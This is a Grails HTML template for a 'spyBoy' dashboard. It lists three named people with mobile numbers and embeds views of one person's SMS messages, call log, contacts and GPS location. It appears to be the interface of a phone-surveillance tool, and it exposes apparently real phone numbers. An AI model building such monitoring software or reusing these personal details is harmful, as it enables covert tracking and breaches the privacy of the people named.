<!DOCTYPE html>
<html>
	<head>
		<meta name="layout" content="base_layout"/>
	</head>
	<body>


<!-- Content Wrapper / Start -->
<div id="content-wrapper">


<!-- Titlebar
================================================== -->
<section id="titlebar">
	<!-- Container -->
	<div class="container">
	
		<div class="eight columns">
			<h2>Shortcodes</h2>
		</div>
		
		<div class="eight columns">
			<nav id="breadcrumbs">
				<ul>
					<li>You are here:</li>
					<li><a href="#">Home</a></li>
					<li><a href="#">Shortcodes</a></li>
					<li>Elements</li>
				</ul>
			</nav>
		</div>

	</div>
	<!-- Container / End -->
</section>


<!-- Content
================================================== -->

<!-- Container -->
<div class="container">


<!-- Tabs
================================================= -->
	<div class="sixteen columns">
	
		<h3 class="headline">Tabs</h3><span class="line" style="margin-bottom:35px;"></span><div class="clearfix"></div>

			<!-- Tabs Navigation -->
			<ul class="tabs-nav">
				<li class="active"><a href="#tab1">איתן ברון : 054-3033425</a></li>
				<li><a href="#tab2">ארז ברון : 054-3334443</a></li>
				<li><a href="#tab3">איילת ברון : 053-2234431</a></li>
			</ul> 
 
			<!-- Tabs Content --> 
			<div class="tabs-container">
				<div class="tab-content" id="tab1">
					<g:include controller="spyBoy" action="contacts" id="contacts"/>
					<!-- Tabs ================================================= -->
					<div class="columns">						
						<!-- Tabs Navigation -->
						<ul class="tabs-nav">
							<li class="active"><a href="#smsTab">הודעות(SMS)</a></li>
							<li><a href="#callLogTab">יומן שיחות</a></li>
							<li><a href="#locationTab">מיקום(GPS)</a></li>
						</ul>
			
						<!-- Tabs Content -->
						<div class="tabs-container">
							<div class="tab-content" id="smsTab">
								<g:include controller="spyBoy" action="sms" id="smsAction"/>				
							</div>
							<div class="tab-content" id="callLogTab">
								<g:include controller="spyBoy" action="callLog" id="callLogAction" params="[max:10,subscriberId:'simSubscriberId123']"/>
							</div>
							<div class="tab-content" id="locationTab">
								<g:include controller="spyBoy" action="location" id="locationAction"/>
							</div>
						</div>
				    </div>				
				</div>
				<div class="tab-content" id="tab2">
				</div>
				<div class="tab-content" id="tab3">
				</div>
			</div>

	</div>

</div>
<!-- Container / End -->

</div>
<!-- Content Wrapper / End -->
	</body>
</html>